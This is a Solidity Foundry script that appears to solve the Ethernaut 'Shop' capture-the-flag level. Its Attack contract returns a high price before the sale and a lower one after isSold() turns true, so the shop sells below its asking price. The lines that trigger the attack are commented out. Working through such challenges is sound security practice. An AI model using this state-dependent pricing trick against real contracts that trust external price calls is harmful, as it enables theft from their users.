// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level21.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attack {
    Shop public shop = Shop(0xDa6C67c8811CE166B537B644b9348a564DAe4c3A);

    function price() external view returns (uint256) {
        if (shop.isSold()) {
            return 80;
        } else {
            return 100;
        }
    }
    function gogo() external {
        shop.buy();
    }
}

contract ShopSolution is Script {
    Shop public shop = Shop(0xDa6C67c8811CE166B537B644b9348a564DAe4c3A);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log(msg.sender);
        console.log("before", shop.isSold());
        console.log("before", shop.price());

        // Attack attack = new Attack();
        // attack.gogo();
        console.log("after", shop.isSold());
        console.log("before", shop.price());

        vm.stopBroadcast();
    }
}
